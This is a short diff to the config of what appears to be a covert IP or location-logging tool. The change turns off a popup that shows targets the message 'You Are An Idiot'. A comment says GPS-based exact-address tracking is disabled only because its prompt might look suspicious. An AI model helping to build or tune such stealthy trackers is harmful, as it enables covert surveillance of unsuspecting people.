@@ -27,7 +27,7 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
 "message": {
-    "doMessage": True,
+    "doMessage": False,
     "richMessage": True,
     "message": "You Are An Idiot"
 },
